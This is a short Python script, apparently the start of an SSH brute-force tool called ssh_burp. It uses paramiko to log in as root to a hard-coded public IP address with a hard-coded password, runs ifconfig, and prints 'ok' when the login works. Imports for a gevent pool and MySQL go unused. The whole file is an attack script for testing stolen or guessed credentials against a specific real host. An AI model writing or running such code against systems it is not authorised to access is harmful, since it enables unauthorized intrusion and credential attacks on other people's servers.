#!/usr/bin/ python
# -*- coding: utf-8 -*-
import time
from gevent import monkey
from gevent.pool import Pool
monkey.patch_all()
import hashlib,MySQLdb,time,paramiko

ip = "47.93.4.61"
port = 22
passwd = "s!"

def ssh_burp():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname = ip , password = passwd, username = 'root', timeout = 10)
        cmd = 'ifconfig'
        stdout = ssh.exec_command(cmd)
        key_word = "Link"
        stdin, stdout, stderr = ssh.exec_command(cmd)
        if key_word in stdout.readline():
            print "ok --> ",ip
    except Exception as e:
        print e
    ssh.close()


ssh_burp()
